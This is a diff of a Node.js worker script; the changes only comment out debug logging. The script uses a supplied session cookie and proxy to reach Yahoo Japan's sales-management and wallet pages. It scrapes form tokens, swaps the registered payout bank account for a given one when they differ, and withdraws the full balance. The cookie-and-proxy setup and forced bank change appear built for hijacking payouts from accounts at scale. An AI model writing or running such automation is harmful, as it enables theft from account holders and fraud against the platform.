@@ -10,7 +10,6 @@ const start = async () => {
     let amount = 0;
     try {
         let { cookie, proxy, bankInfo } = workerData;
-        console.log(' ####### workerData: ', workerData);
         let headers = {
             cookie,
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.64',
@@ -29,7 +28,6 @@ const start = async () => {
                 password: proxy.password,
             },
         };
-        console.log(' ###### config : ', config.get('env'));
         if (config.get('env') === 'development') {
             proxyConfig = null;
         }
@@ -38,9 +36,9 @@ const start = async () => {
         let payload = null;
 
         //============ UPDATE BANK =============
-        console.log(' ==== list ==== ');
+        // console.log(' ==== list ==== ');
         let resList = await axios.get('https://salesmanagement.yahoo.co.jp/list', { headers, proxy: proxyConfig });
-        console.log(' 111111111111 ');
+        // console.log(' 111111111111 ');
         // Fs.writeFileSync('list.html', resList.data);
         $ = cheerio.load(resList.data);
         crumb = $('input[name=".crumb"]').val();
@@ -48,7 +46,7 @@ const start = async () => {
             '.crumb': crumb,
         };
 
-        console.log(' ==== payout_confirm ==== ');
+        // console.log(' ==== payout_confirm ==== ');
         let resPayoutConfirm = await axios.post('https://salesmanagement.yahoo.co.jp/payout_confirm', Qs.stringify(payload), { headers, proxy: proxyConfig });
         $ = cheerio.load(resPayoutConfirm.data);
         amount = $('#transferDetails > div > div > div:nth-child(2) > div:nth-child(3) > span').text().trim();
@@ -62,7 +60,7 @@ const start = async () => {
 
         let backCurrentText = $('#yjMain > div.acMdPaymentInfo.mT30.mB40 > div.TransferDetails > div > div > div:nth-child(5) > div:nth-child(3) > span');
         backCurrentText = backCurrentText.text().trim();
-        console.log(' ### backCurrentText: ', backCurrentText);
+        // console.log(' ### backCurrentText: ', backCurrentText);
         if (!backCurrentText.includes(bankInfo.bkSubName) || !backCurrentText.includes(bankInfo.bkAccountNum.substring(bankInfo.bkAccountNum.length - 2, bankInfo.bkAccountNum.length))) {
             console.log(' ======== Đổi Bank ========== ');
             let resChangeBank = await axios.get('https://edit.wallet.yahoo.co.jp/config/wallet_trans_update?.done=https%3A%2F%2Fsalesmanagement.yahoo.co.jp%2Flist', {
@@ -73,10 +71,10 @@ const start = async () => {
             });
             $ = cheerio.load(resChangeBank.data);
             crumb = $('input[name=".crumb"]').val();
-            console.log(' ######### crumb: ', crumb);
+            // console.log(' ######### crumb: ', crumb);
 
             if (!crumb) {
-                console.log(' ======== Confirm Old Bank ========== ');
+                // console.log(' ======== Confirm Old Bank ========== ');
                 if (!bankInfo.old_bank_number) {
                     throw new Error('Enter Old Bank Number');
                 }
@@ -102,7 +100,7 @@ const start = async () => {
                 $ = cheerio.load(resConfirmOldBank.data);
                 crumb = $('input[name=".crumb"]').val();
             }
-            console.log(' ######### crumb: ', crumb);
+            // console.log(' ######### crumb: ', crumb);
 
             payload = {
                 '.crumb': crumb,
@@ -119,7 +117,7 @@ const start = async () => {
                 edit: '同意して変更',
                 ...bankInfo,
             };
-            console.log(payload);
+            // console.log(payload);
 
             payload = Qs.stringify(payload);
             let resChangeBankPost = await axios.post('https://edit.wallet.yahoo.co.jp/config/wallet_recv_account_control', payload, {
@@ -146,22 +144,22 @@ const start = async () => {
 
             backCurrentText = $('#yjMain > div.acMdPaymentInfo.mT30.mB40 > div.TransferDetails > div > div > div:nth-child(5) > div:nth-child(3) > span');
             backCurrentText = backCurrentText.text().trim();
-            console.log(' ### backCurrentText: ', backCurrentText);
+            // console.log(' ### backCurrentText: ', backCurrentText);
             if (!backCurrentText.includes(bankInfo.bkSubName) || !backCurrentText.includes(bankInfo.bkAccountNum.substring(bankInfo.bkAccountNum.length - 2, bankInfo.bkAccountNum.length))) {
                 throw new Error('Change Bank Error');
             }
             crumb = resPayoutConfirm.data.split('.crumb')[1].split('form.appendChild(input1)')[0].replace(/\n/g, '').replace('";  input2.value = "', '').replace('"', '').replace(';', '').trim();
         }
 
-        console.log(' ====== Confirm Rut Tien ======= ');
-        console.log(' #### crumb: ', crumb);
+        // console.log(' ====== Confirm Rut Tien ======= ');
+        // console.log(' #### crumb: ', crumb);
 
         payload = {
             ba: amount,
             '.crumb': crumb,
         };
-        console.log(' ==== payout_done ==== ');
-        console.log(' #### payload: ', payload);
+        // console.log(' ==== payout_done ==== ');
+        // console.log(' #### payload: ', payload);
         let resPayoutDone = await axios.post('https://salesmanagement.yahoo.co.jp/payout_done', Qs.stringify(payload), {
             headers: {
                 cookie,
@@ -171,16 +169,16 @@ const start = async () => {
             proxy: proxyConfig,
         });
         // Fs.writeFileSync('resPayoutDone.html', resPayoutDone.data);
-        console.log(' ==== payout_confirm ==== ');
-        try {
-            console.log(' ####### resPayoutDone 111: ', resPayoutDone.res);
-            console.log(' ####### resPayoutDone 222 : ', resPayoutDone.res.responseUrl);
-        } catch (error) {}
+        // console.log(' ==== payout_confirm ==== ');
+        // try {
+        //     console.log(' ####### resPayoutDone 111: ', resPayoutDone.res);
+        //     console.log(' ####### resPayoutDone 222 : ', resPayoutDone.res.responseUrl);
+        // } catch (error) {}
 
-        try {
-            console.log(' ####### resPayoutDone 3333 : ', resPayoutDone.res.IncomingMessage);
-            console.log(' ####### resPayoutDone 4444: ', resPayoutDone.res.IncomingMessage.responseUrl);
-        } catch (error) {}
+        // try {
+        //     console.log(' ####### resPayoutDone 3333 : ', resPayoutDone.res.IncomingMessage);
+        //     console.log(' ####### resPayoutDone 4444: ', resPayoutDone.res.IncomingMessage.responseUrl);
+        // } catch (error) {}
 
         parentPort.postMessage({ status: 'SUCCESS', message: 'SUCCESS', amount });
         // let resPayoutFinish = await axios.get(resPayoutDone.response.location, {
